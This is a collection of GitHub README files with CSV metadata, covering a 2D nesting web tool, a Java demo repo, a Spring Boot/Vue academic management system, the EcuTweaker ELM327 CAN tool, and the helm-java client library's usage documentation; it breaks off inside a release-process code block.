cn.jiguang.sdk.exception.ApiErrorException
```",20,1,1,Apache-2.0
VovaStelmashchuk/nest2D,main,"# NestApp

The online platform for Nest algorithm.

![screen of working](./samples/web_screen.png)

## How to use?

#### [Visit Nest2D](https://nest2d.online/)

# What is Nest Problem?

Given a square piece of material and some letters to be laser-cut:

We want to pack all the letters into the square, using as little material as possible. If a single square is not enough,
we also want to minimize the number of squares used.

In the CNC world this is called ""nesting"", and software that does this is typically targeted at industrial customers and
very expensive.

for more detail , please go to [SVGNest](https://github.com/Jack000/SVGnest)

## The repository based on few github project, I keep the original history of commits.

Also, i have some plane to modify the project. The project will be support DXF file. The SVG format available only for
the preview. The project will be migrate to Kotlin fully or majority.

Fill free to create issues or pull requests. The main goal of the project is mainly free and open source solution for
nesting problem. I try to find the way to compensate the price of cloud server. **You Star of the project can help to
apply to some open source program.**

### Big Thanks to [JeroenGar](https://github.com/JeroenGar)

He is the author of [jagua-rs](https://github.com/JeroenGar/jagua-rs). I use his project as the core service for the
service. Without his project, I can't make this project.

I use slightly modified version of his project. Can be found [here](https://github.com/VovaStelmashchuk/jagua-rs)

### Credits:

- [SVGNest](https://github.com/Jack000/SVGnest)
- [DXFReader](https://github.com/wholder/DXFReader)
- [NEST4J fork](https://github.com/micycle1/Nest4J/tree/master)

### Referenced Paper

- [López-Camacho *et al.* 2013](http://www.cs.stir.ac.uk/~goc/papers/EffectiveHueristic2DAOR2013.pdf)
- [Kendall 2000](http://www.graham-kendall.com/papers/k2001.pdf)
- [E.K. Burke *et al.* 2006](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.440.379&rep=rep1&type=pdf)

### Hollow Polygon

For those hollow polygons, Nest4J provides a simple way to express by 2d coordinate system. If one polygon is inside in
another by their coordinates, the Nest4J will detect it automatically.

### DXF tags support

| Tag          | Support status |
|--------------|----------------|
| `Line`       | Supported      |
| `Circle`     | In plan        |
| `LwPolyline` | In plan        |
| `Polyline`   | In plan        |
| `Arc`        | In plan        |
| `Spline`     | In plan        |
| `Other`      | Not supported  |

### Backend doc

Backend read me is [here](./backend/ReadMe.md)",2,1,2,MIT
nipafx/modern-java-demo,main,"# Modern Java in Action

A repository for my live-coding talk [Modern Java in Action](https://nipafx.dev/talk-java-action).

Each step is its own commit.
Check them out to see here what needs to be done.
",0,0,1,EPL-2.0
giteecode/JwSystemPublic,master,"## 基于Java+Springboot+Vue的教务管理系统(源代码+数据库)115

## 一、系统介绍
本项目前后端分离，本系统分为管理员、教务人员、教师、学生四种角色

### 1、学生：
登录、首页统计、学生选课、成绩查询、个人课表、学生评价、教学计划、培养方案、个人中心、密码修改

### 2、教师：
成绩录入、课程评价查询、选课申请、个人信息、个人课表、成绩统计

### 3、教务人员：
学院管理、专业管理、班级管理、教学计划管理、培养方案管理、教学评价管理、档案管理、结课申请管理、开课申请管理、选课分配管理、学生管理

### 4、管理员：
拥有全部功能的权限、权限管理、角色管理。用户管理

## 二、所用技术

后端技术栈：

- Springboot
- MybatisPlus
- Mysql
- Maven
- Shiro
- SpringSecurity

前端技术栈：

- Vue 
- Vue-router 
- axios 
- elementUi

## 三、环境介绍

基础环境 :IDEA/eclipse, JDK1.8, Mysql5.7及以上,Maven3.6, node14

所有项目以及源代码本人均调试运行无问题 可支持远程调试运行

## 四、页面截图
### 1、学生
![contents](./picture/picture01.png)
![contents](./picture/picture1.png)
![contents](./picture/picture2.png)
![contents](./picture/picture3.png)
![contents](./picture/picture4.png)
![contents](./picture/picture5.png)
![contents](./picture/picture6.png)
![contents](./picture/picture7.png)
![contents](./picture/picture8.png)
![contents](./picture/picture9.png)
![contents](./picture/picture10.png)
![contents](./picture/picture11.png)

### 2、老师
![contents](./picture/picture12.png)
![contents](./picture/picture13.png)
![contents](./picture/picture14.png)
![contents](./picture/picture15.png)
![contents](./picture/picture16.png)
![contents](./picture/picture17.png)
![contents](./picture/picture18.png)
![contents](./picture/picture19.png)
![contents](./picture/picture20.png)
![contents](./picture/picture21.png)

### 3、教务人员
![contents](./picture/picture22.png)
![contents](./picture/picture23.png)
![contents](./picture/picture24.png)
![contents](./picture/picture25.png)
![contents](./picture/picture26.png)
![contents](./picture/picture27.png)
![contents](./picture/picture28.png)
![contents](./picture/picture29.png)
![contents](./picture/picture30.png)

### 4、管理员
![contents](./picture/picture31.png)
![contents](./picture/picture32.png)
![contents](./picture/picture33.png)
![contents](./picture/picture34.png)
![contents](./picture/picture35.png)
![contents](./picture/picture36.png)
![contents](./picture/picture37.png)
![contents](./picture/picture38.png)

## 五、浏览地址

访问地址：http://localhost:8081
- 学生账号/密码：20001/123456
- 教师账号/密码：9/123456
- 教务人员账号/密码：3/123456
- 管理员账号/密码：1/123456

## 六、部署教程
1. 使用Navicat或者其它工具，在mysql中创建对应名称的数据库，并执行项目的sql文件；
2. 使用IDEA/Eclipse导入Jwsystem项目，若为maven项目请选择maven，等待依赖下载完成；
3. 修改application.yml里面的数据库配置和文件路径配置，启动后端项目
4. vscode或idea打开Jwsystem-front项目，
5. 在编译器中打开terminal，执行npm install 依赖下载完成后执行 npm run dev,执行成功后会显示访问地址

",0,5,1,
cedricp/ecutweaker,master,"# EcuTweaker [![Android CI](https://github.com/cedricp/ecutweaker/actions/workflows/android.yml/badge.svg)](https://github.com/cedricp/ecutweaker/actions/workflows/android.yml) [![Donate](https://img.shields.io/badge/Donate-PayPal-green.svg)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=cedricpaille%40gmail%2ecom&lc=CY&item_name=codetronic&currency_code=EUR&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted) [![Discord](https://img.shields.io/discord/1117970325267820675?label=Discord&style=flat-square)](https://discord.gg/cBqDh9bTHP)

EcuTweaker is tool to create your own ECU parameters screens and connect to a CAN network with a cheap ELM327 interface.


## Informations

**_DataBase not included, do not forget to install database as ecu.zip or full mode in to root clone repo._**

### Report bugs
Report bugs you found in [issues](https://github.com/cedricp/ecutweaker/issues).
In order to help us fix the problem, please take a screenshot of the error you get and also attach your log file (under the Logs folder) as well. Add [Bug] to the title to help us quickly identify the category of the issue.

<!--
### Suggestions/ideas
Tell us what you think we can do better in [discussions](https://github.com/cedricp/ecutweaker/discussions).
Give detailed discription to help us understand what you are looking for. Add [Suggestion] to the title to help us quickly identify the category of the issue. Your suggestion might not be accept, but hey, maybe we will accept your suggestion next time! :)
-->

### Legal Disclaimer
This Website and Project is in no way affiliated with, authorized, maintained, sponsored or endorsed by ANYONE. This is an independent and unofficial project for educational use ONLY. Do not use for any other purpose than education, testing and research.


Happy CAN-Hacking :)

To make this application more reliable, I need to buy hardware, cables and devices, so please consider contributing by making a donation (hardware or money). Of course you can contribute by filling bug reports and sending patches.
",3,3,1,GPL-3.0
manusa/helm-java,main,"# Helm Client for Java

Run Helm commands directly from Java with this client library without the need for a Helm CLI.

It allows you to execute Helm commands directly from Java without requiring a separate Helm installation.
Despite this, it still leverages the native Helm libraries, which are written in Go, to function.
As a result, you can expect the same behavior as you would get from using Helm directly.

## Getting started

Add the dependency to your project:

```xml
<dependency>
  <groupId>com.marcnuri.helm-java</groupId>
  <artifactId>helm-java</artifactId>
  <version>0.0.12</version>
</dependency>
```

Start using it:

```java
public static void main(String... args) {
  new Helm(Paths.get(""path"", ""to"", ""chart"")).install().call();
}
```

Check the features section for more examples and documentation.

## Features

### Create

Equivalent of [`helm create`](https://helm.sh/docs/helm/helm_create/).

Creates a chart directory along with the common files and directories used in a chart.

``` java
Helm.create()
  // Name of the chart to create
  .withName(""test"")
  // Path to the directory where the new chart directory will be created
  .withDir(Paths.get(""/tmp""))
  .call();
```

### Dependency

Equivalent of [`helm dependency`](https://helm.sh/docs/helm/helm_dependency/).

Manage a chart's dependencies.

#### Dependency build

Equivalent of [`helm dependency build`](https://helm.sh/docs/helm/helm_dependency_build/).

Rebuild the chart's on-disk dependencies (`charts/`) based on the Chart.lock file.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().build()
  // Optionally specify a keyring containing public keys (used for verification)
  .keyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally skip refreshing the local repository cache
  .skipRefresh()
  // Optionally verify the packages against signatures
  .verify()
  // Optionally enable verbose output
  .debug()
  .call();
```

#### Dependency list

Equivalent of [`helm dependency list`](https://helm.sh/docs/helm/helm_dependency_list/).

List the dependencies for the given chart.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().list()
  .getDependencies();
```

#### Dependency update

Equivalent of [`helm dependency update`](https://helm.sh/docs/helm/helm_dependency_update/).

Update chart's on-disk dependencies (`charts/`) to mirror the contents of Chart.yaml.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().update()
  // Optionally specify a keyring containing public keys (used for verification)
  .keyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally skip refreshing the local repository cache
  .skipRefresh()
  // Optionally verify the packages against signatures
  .verify()
  // Optionally enable verbose output
  .debug()
  .call();
```

### Install

Equivalent of [`helm install`](https://helm.sh/docs/helm/helm_install/).

Installs a chart archive.

``` java
// Instantiate the command with chart reference
InstallCommand installCommand = Helm.install(""chart/reference"");
// Instatiate the command with chart archive
InstallCommand installCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).install();
Release result = installCommand
  // Name of the release to install
  .withName(""release-name"")
  // Optionally generate a release name (and omit the name parameter)
  .generateName()
  // Optionally specify a template for the name generation
  .withNameTemplate(""a-chart-{{randAlpha 6 | lower}}"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace to install the release into
  .withNamespace(""namespace"")
  // Optionally create the namespace if not present
  .createNamespace()
  // Optionally, if set, the installation process deletes the installation on failure
  .atomic()
  // Optionally specify a custom description for the release
  .withDescription(""the-description"")
  // Optionally enable the use of development versions too
  .devel()
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally disable the validation of rendered templates against the Kubernetes OpenAPI Schema
  .disableOpenApiValidation()
  // Optionally enable dry run mode to simulate an install
  .dryRun()
  // Optionally specify the dry run strategy (client, server, or none). If unset, defaults to client
  .withDryRunOption(DryRun.CLIENT)
  // Optionally wait until all Pods are in a ready state, PVCs are bound, Deployments have
  // minimum (Desired minus maxUnavailable) Pods in ready state and Services have an IP
  // address (and Ingress if a LoadBalancer) before marking the release as successful. 
  .waitReady()
  // Optionally set typed values for the chart (can be repeated)
  .set(""key"", ""value"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable verbose output
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Lint

Equivalent of [`helm lint`](https://helm.sh/docs/helm/helm_lint/).

Examine a chart for possible issues.

``` java
LintResult result = new Helm(Paths.get(""path"", ""to"", ""chart"")).lint()
  // Optionally enable strict mode (fail on lint warnings)
  .strict()
  // Optionally enable quiet mode (only show warnings and errors) 
  .quiet()
  .call();
result.isFailed(); // true if linting failed
result.getMessages(); // list of linting messages
```

### List

Equivalent of [`helm list`](https://helm.sh/docs/helm/helm_list/).

Lists all the releases for a specified namespace (uses current namespace context if namespace not specified).

``` java
List<Release> releases = Helm.list()
  // Optionally specify the Kubernetes namespace to list the releases from
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally show all releases without any filter applied
  .all()
  // Optionally show releases across all namespaces
  .allNamespaces()
  // Optionally show deployed releases
  // If no other option is specified, this will be automatically enabled
  .deployed()
  // Optionally show failed releases
  .failed()
  // Optionally show pending releases
  .pending()
  // Optionally show superseded releases
  .superseded()
  // Optionally show uninstalled releases (if 'helm uninstall --keep-history' was used)
  .uninstalled()
  // Optionally show releases that are currently being uninstalled
  .uninstalling()
  .call();
```

### Package

Equivalent of [`helm package`](https://helm.sh/docs/helm/helm_package/).

Package a chart directory into a chart archive.

``` java
Path result = new Helm(Paths.get(""path"", ""to"", ""chart"")).package()
  // Optionally specify a target directory
  .destination(Paths.get(""path"", ""to"", ""destination""))
  // Optionally enable signing
  .sign()
  // Optionally specify a key UID (required if signing)
  .withKey(""KEY_UID"")
  // Optionally specify a keyring (required if signing)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally specify a file containing the passphrase for the signing key
  .withPassphraseFile(Paths.get(""path"", ""to"", ""passphrase""))
  .call();
```

### Push

Equivalent of [`helm push`](https://helm.sh/docs/helm/helm_push/).

Upload a chart to a registry.

``` java
Helm.push()
  // Location of the packaged chart (.tgz) to push
  .withChart(Paths.get(""path"", ""to"", ""chart"", ""package""))
  // URI of the remote registry to push the chart to
  .withRemote(""oci://remote-server.example.com:12345"");
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Registry

Equivalent of [`helm registry`](https://helm.sh/docs/helm/helm_registry/).

Log in to or log out from a registry.

#### Registry login

Equivalent of [`helm registry login`](https://helm.sh/docs/helm/helm_registry_login/).

Log in to a registry.

``` java
Helm.registry().login()
  // The host to log in to.
  .withHost(""host"")
  // Registry username
  .withUsername(""username"");
  // Registry password or identity token.
  .withPassword(""password"");
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Registry logout

Equivalent of [`helm registry logout`](https://helm.sh/docs/helm/helm_registry_logout/).

Log out from a registry.

``` java
Helm.registry().logout()
  // The host to log out from.
  .withHost(""host"")
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Repo

Equivalent of [`helm repo`](https://helm.sh/docs/helm/helm_repo/).

Add, list, remove, update, and index chart repositories.

#### Repo add

Equivalent of [`helm repo add`](https://helm.sh/docs/helm/helm_repo_add/).

Add a chart repository.

``` java
Helm.repo().add()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Name of the repository to add
  .withName(""repo-1"")
  // URL of the repository to add
  .withUrl(URI.create(""https://charts.helm.sh/stable""))
  // Optionally specify a username for HTTP basic authentication
  .withUsername(""user"")
  // Optionally specify a password for HTTP basic authentication
  .withPassword(""pass"")
  // Optionally specify an SSL certificate file to identify the HTTPS client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the HTTPS client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  .call()
```

#### Repo list

Equivalent of [`helm repo list`](https://helm.sh/docs/helm/helm_repo_list/).

List chart repositories.

``` java
List<Repository> respositories = Helm.repo().list()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

#### Repo remove

Equivalent of [`helm repo remove`](https://helm.sh/docs/helm/helm_repo_remove/).

Remove one or more chart repositories.

``` java
Helm.repo().remove()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Add a repository name to the list of repos to remove
  .withRepo(""repo-1"")
  // Add another repository name to the list of repos to remove
  .withRepo(""repo-2"")
  .call();
```

#### Repo update

Equivalent of [`helm repo update`](https://helm.sh/docs/helm/helm_repo_update/).

Update information of available charts locally from chart repositories.

``` java
Helm.repo().update()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Add a repository name to the list of repos to remove
  .withRepo(""repo-1"")
  // Add another repository name to the list of repos to remove
  .withRepo(""repo-2"")
  .call();
```

### Search

Equivalent of [`helm search`](https://helm.sh/docs/helm/helm_search/).

This command provides the ability to search for Helm charts in various places including the Artifact Hub and the repositories you have added.

#### Repo

Equivalent of [`helm search repo`](https://helm.sh/docs/helm/helm_search_repo/).

Search repositories for a keyword in charts.

``` java
List<SearchResult> results = Helm.search().repo()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Optionally set the keyword to match against the repo name, chart name, chart keywords, and description.
  .withKeyword(""keyword"")
  // Optionally use regular expressions for searching.
  .regexp()
  // Optionally search for development versions too (alpha, beta, and release candidate releases).
  .devel()
  // Optionally search using semantic versioning constraints
  .withVersion("">=1.0.0"")
  .call();
```

### Show

Equivalent of [`helm show`](https://helm.sh/docs/helm/helm_show/).

Show information about a chart.

#### Show all

Equivalent of [`helm show all`](https://helm.sh/docs/helm/helm_show_all/).

Show **all** information about a chart.

``` java
// Instantiate the command with chart reference
ShowCommand showCommand = Helm.show(""chart/reference"");
// Instatiate the command with chart archive
ShowCommand showCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).show();
String result = showCommand.all()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show chart

Equivalent of [`helm show chart`](https://helm.sh/docs/helm/helm_show_chart/).

Show the chart's definition.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .chart()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show CRDs

Equivalent of [`helm show crds`](https://helm.sh/docs/helm/helm_show_crds/).

Show the chart's CRDs.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .crds()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show README

Equivalent of [`helm show readme`](https://helm.sh/docs/helm/helm_show_readme/).

Show the chart's README.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .readme()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show values

Equivalent of [`helm show values`](https://helm.sh/docs/helm/helm_show_values/).

Show the chart's values.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .values()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Template

Equivalent of [`helm template`](https://helm.sh/docs/helm/helm_template/).

This command renders chart templates locally and displays the output.

``` java
// Instantiate the command with chart reference
TemplateCommand templateCommand = Helm.template(""chart/reference"");
// Instatiate the command with chart archive
TemplateCommand templateCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).template();
String result = templateCommand
  // Optionally specify a name for the release
  .withName(""release-name"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace for the release
  .withNamespace(""namespace"")
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally set values for the chart
  .set(""key"", ""value"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable debug mode to print out verbose information
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Test

Equivalent of [`helm test`](https://helm.sh/docs/helm/helm_test/).

This command runs the tests for a release.

``` java
Release result = Helm.test(""chart/reference"")
  // Optionally specify the time (in seconds) to wait for any individual Kubernetes operation (like Jobs for hooks) (default 300)
  .withTimeout(int timeout)
  // Optionally specify the Kubernetes namespace
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally enable verbose output
  .debug()
  .call();
```

### Uninstall

Equivalent of [`helm uninstall`](https://helm.sh/docs/helm/helm_uninstall/).

This command takes a release name and uninstalls the release.

``` java
String result = Helm.uninstall(""chart/reference"")
  // Optionally enable dry run mode to simulate an uninstall
  .dryRun()
  // Optionally prevent hooks from running during uninstallation
  .noHooks()
  // Optionally treat ""release not found"" as a successful uninstall
  .ignoreNotFound()
  // Optionally remove all associated resources and mark the release as deleted, but retain the release history
  .keepHistory()
  // Optionally select the deletion cascading strategy for the dependents. If unset, defaults to background
  .withCascade(Cascade.BACKGROUND)
  // Optionally specify the Kubernetes namespace to uninstall the release from
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally enable verbose output
  .debug()
  .call();
```

### Upgrade

Equivalent of [`helm upgrade`](https://helm.sh/docs/helm/helm_upgrade/).

Upgrades a release to a new version of a chart.

``` java
// Instantiate the command with chart reference
UpgradeCommand upgradeCommand = Helm.upgrade(""chart/reference"");
// Instatiate the command with chart archive
UpgradeCommand upgradeCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).upgrade();
Release result = upgradeCommand
  // Name of the release to upgrade
  .withName(""release-name"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace to upgrade the release
  .withNamespace(""namespace"")
  // Optionally run an installation if a release by this name doesn't already exist
  .install()
  // Optionally force resource updates through a replacement strategy
  .force()
  // Optionally reset the values to the ones built into the chart when upgrading
  .resetValues()
  // Optionally reuse the last release's values and merge in any overrides from the current values when upgrading
  // Ignored if used in combination with resetValues()
  .reuseValues()
  // Optionally reset the values to the ones built into the chart,
  // apply the last release's values and merge in any overrides from the current values when upgrading
  // Ignored if used in combination with resetValues() or reuseValues()
  .resetThenReuseValues()
  // Optionally, if set, upgrade process rolls back changes made in case of failed upgrade
  .atomic()
  // Optionally allow deletion of new resources created in this upgrade when upgrade fails
  .cleanupOnFail()
  // Optionally create the release namespace if not present (if install() is set)
  .createNamespace()
  // Optionally specify a custom description
  .withDescription(""the-description"")
  // Optionally enable the use of development versions too
  .devel()
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally disable the validation of rendered templates against the Kubernetes OpenAPI Schema
  .disableOpenApiValidation()
  // Optionally enable dry run mode to simulate an install
  .dryRun()
  // Optionally specify the dry run strategy (client, server, or none). If unset, defaults to client
  .withDryRunOption(DryRun.CLIENT)
  // Optionally wait until all Pods are in a ready state, PVCs are bound, Deployments have
  // minimum (Desired minus maxUnavailable) Pods in ready state and Services have an IP
  // address (and Ingress if a LoadBalancer) before marking the release as successful. 
  .waitReady()
  // Optionally set typed values for the chart (can be repeated)
  .set(""key"", ""value"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable verbose output
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Version

Similar to [`helm version`](https://helm.sh/docs/helm/helm_version/).

Returns the version of the underlying Helm library.

``` java
String version = Helm.version();
```

## Development

### Project Structure

- Go:
  - `native`: contains the Go project that creates the native c bindings
- Java:
  - `helm-java`: contains the actual Helm Java client library
  - `lib`: contains the Java modules related to the native c binding libraries
    - `api`: contains the API for the native interfaces
    - `darwin-amd64`: contains the Java native access library for darwin/amd64
    - `darwin-arm64`: contains the Java native access library for darwin/arm64
    - `linux-amd64`: contains the Java native access library for linux/amd64
    - `linux-arm64`: contains the Java native access library for linux/arm64
    - `windows-amd64`: contains the Java native access library for windows/amd64

### Release Process

#### Release to Maven Central

To release a new version automatically:

```shell
make release V=X.Y.Z VS=X.Y
```
- `V`: New version to release.
- `VS`: New SNAPSHOT version for Maven.

To release a new version manually:

1. Update the version in the `pom.xml` file.
   ```shell
   mvn versions:set -DnewVersion=X.Y.Z -DgenerateBackupPoms=false
   ```
2. Commit and tag the release with the  `pom.xml` version.
   ```shell
   git add .
   git commit -m ""[RELEASE] vX.Y.Z released""
   git tag vX.Y.Z
   git push origin vX.Y.Z
   ```
3. Update the version in the `pom.xml` file to the next snapshot version.
   ```shell
   mvn versions:set -DnewVersion=X.Y-SNAPSHOT -DgenerateBackupPoms=false
   ```
4. Commit the changes with the following message:
   ```shell
